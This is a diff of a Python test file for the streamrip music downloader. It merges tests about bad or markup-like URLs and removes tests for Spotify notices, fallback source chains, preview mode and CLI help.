     assert mock_main.pending == []
 
 
-async def test_one_bad_url_costs_only_itself(caplog):
-    """A url streamrip can't queue (here a Tidal video) skips just that url."""
+async def test_a_bad_url_costs_only_itself():
+    # A tidal video can't be queued, and Rich reads "[/x]" as a markup tag:
+    # each used to stop every url after it.
     main = _main()
     main.clients["tidal"].logged_in = True
 
     await main.add_all(
-        ["https://tidal.com/browse/video/5678", "https://tidal.com/browse/album/1234"]
+        [
+            "[/x]",
+            "https://tidal.com/browse/video/5678",
+            "https://tidal.com/browse/album/1234",
+        ]
     )
 
     assert [type(p) for p in main.pending] == [PendingAlbum]
-    assert "Error with https://tidal.com/browse/video/5678: NotImplementedError" in (
-        caplog.text
-    )
-
-
-async def test_a_url_that_looks_like_markup_is_only_an_invalid_url():
-    """Rich reads "[/x]" as a tag that closes nothing and raises: one such token
-    in a list of urls used to stop every url after it, as a traceback."""
-    main = _main()
-    main.clients["tidal"].logged_in = True
-    await main.add_all(["[/x]", "https://tidal.com/browse/album/1234"])
-    assert [type(p) for p in main.pending] == [PendingAlbum]
-
-
-async def test_a_search_for_text_that_looks_like_markup_finds_nothing(mock_main):
-    mock_main.clients["deezer"].search = AsyncMock(return_value=[{"data": []}])
-    await mock_main.search_take_first("deezer", "track", "[/x] [live]")
-    assert mock_main.pending == []
-
-
-def test_spotify_youtube_backend_notice_is_lossy_and_points_to_lossless():
-    notice = notice_for("spotify", "youtube")
-    assert "lossy" in notice
-    assert "YouTube Music" in notice
-    # The playlist tools (once Music-Sync) read the list and download it elsewhere.
-    assert "streamrip playlist download spotify" in notice
-
-
-@pytest.mark.parametrize("backend", [None, "spotify"])
-def test_the_spotify_backend_notice_is_about_spotify_itself(backend):
-    notice = notice_for("spotify", backend)
-    assert "Spotify itself" in notice
-    assert "lossless" in notice
-    assert MUSIC_SYNC in notice
-
-
-@pytest.mark.parametrize("source", ["qobuz", "tidal", "deezer", "soundcloud"])
-def test_other_sources_have_nothing_to_say(source):
-    assert notice_for(source) is None
 
 
 async def test_a_source_is_announced_once_however_often_it_is_used():
@@ -1165,12 +830,7 @@ async def test_a_source_is_announced_once_however_often_it_is_used():
         for source in ("spotify", "spotify", "deezer", "qobuz", "deezer"):
             await main.get_logged_in_client(source)
 
-    printed = [call.args[0] for call in screen.print.call_args_list]
-    assert len(printed) == 1
-    assert "Spotify" in printed[0]
-
-
-# --- the version --------------------------------------------------------------
+    assert len(screen.print.call_args_list) == 1
 
 
 def test_pyproject_and_the_package_have_the_same_version():
@@ -1178,79 +838,3 @@ def test_pyproject_and_the_package_have_the_same_version():
     m = re.search(r'^version\s*=\s*"([^"]+)"', pyproject, re.MULTILINE)
     assert m is not None
     assert m.group(1) == __version__
-
-
-@pytest.mark.parametrize(
-    ("given", "primary", "chain"),
-    [
-        (None, "qobuz", []),
-        ("", "qobuz", []),
-        ("tidal", "qobuz", ["tidal"]),
-        ("Tidal, deezer", "qobuz", ["tidal", "deezer"]),
-        (
-            "tidal,qobuz,tidal deezer",
-            "qobuz",
-            ["tidal", "deezer"],
-        ),  # no primary, no repeats
-    ],
-)
-def test_a_fallback_chain_is_read_in_order(given, primary, chain):
-    from streamrip.rip.main import fallback_chain
-
-    assert fallback_chain(given, primary) == chain
-
-
-def test_a_fallback_source_that_is_no_source_is_refused(tmp_path, monkeypatch):
-    monkeypatch.setenv("STREAMRIP_NO_UPDATE_CHECK", "1")
-    path = tmp_path / "config.toml"
-    set_user_defaults(path)
-    runner = CliRunner()
-    list_ = tmp_path / "l.csv"
-    list_.write_text("title,artist\nSong,Band\n")
-    result = runner.invoke(
-        rip, ["--config-path", str(path), "csv", "-fs", "tidal,nope", str(list_)]
-    )
-    assert result.exit_code == 2
-    assert "nope" in result.output
-
-
-def test_preview_says_what_would_happen_and_downloads_nothing(
-    run, tracks_csv, monkeypatch
-):
-    shown = []
-    monkeypatch.setattr(
-        "streamrip.rip.options.show_plan", lambda main: shown.append(main)
-    )
-    result = run("csv", tracks_csv, "--source", "tidal", "--preview")
-    assert result.exit_code == 0, result.output
-    assert len(shown) == 1
-    run.calls["rip"].assert_not_awaited()
-    run("csv", tracks_csv, "--source", "tidal")
-    run.calls["rip"].assert_awaited_once()
-
-
-def test_the_help_has_the_sections_of_the_web_interface():
-    from streamrip.rip.cli import rip
-
-    help_text = CliRunner().invoke(rip, ["--help"]).output
-    sections = [
-        line.rstrip(":")
-        for line in help_text.splitlines()
-        if line.endswith(":") and line[0].isupper()
-    ]
-    assert [
-        s
-        for s in sections
-        if s in {"Download", "Playlists", "Accounts", "Library", "Settings", "Web"}
-    ] == [
-        "Download",
-        "Playlists",
-        "Accounts",
-        "Library",
-        "Settings",
-        "Web",
-    ]
-    for command in ("url", "id", "csv", "lastfm", "verify", "repair", "plan"):
-        assert (f"  {command} " in help_text) == (
-            command != "plan"
-        )  # plan is --preview now
